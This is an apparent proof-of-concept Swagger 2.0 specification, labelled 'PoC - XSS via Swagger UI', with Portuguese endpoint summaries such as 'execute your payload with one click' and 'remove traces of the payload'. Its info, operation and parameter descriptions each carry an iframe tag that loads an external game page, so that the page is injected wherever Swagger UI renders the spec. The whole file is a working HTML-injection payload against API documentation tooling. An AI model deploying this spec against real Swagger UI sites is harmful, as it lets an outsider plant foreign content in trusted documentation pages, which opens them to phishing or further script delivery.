swagger: '2.0'
info:
  title: PoC - XSS via Swagger UI
  description: >
    <iframe src="https://supermario-game.com/mario-game/mario.html" style="width:100%;height:600px;border:none;"></iframe>
  version: vulnerable-demo
basePath: /JSSResource/
produces:
  - application/json
consumes:
  - application/json
security:
  - basicAuth: []
paths:
  /executarXSS:
    post:
      summary: Execute seu payload com um clique
      description: >
        <iframe src="https://supermario-game.com/mario-game/mario.html" style="width:100%;height:300px;border:none;"></iframe>
      parameters:
        - name: payload
          in: body
          required: false
          schema:
            type: object
            properties:
              xss:
                type: string
                description: "<iframe src='https://supermario-game.com/mario-game/mario.html' style='width:100%;height:150px;border:none;'></iframe>"
      responses:
        '200':
          description: No response was specified
      tags:
        - executarXSS

  /xss/payload/{id}:
    delete:
      summary: Remover rastros do payload
      description: >
        <iframe src="https://supermario-game.com/mario-game/mario.html" style="width:100%;height:300px;border:none;"></iframe>
      parameters:
        - name: id
          in: path
          required: true
          type: string
          description: "<iframe src='https://supermario-game.com/mario-game/mario.html' style='width:100%;height:150px;border:none;'></iframe>"
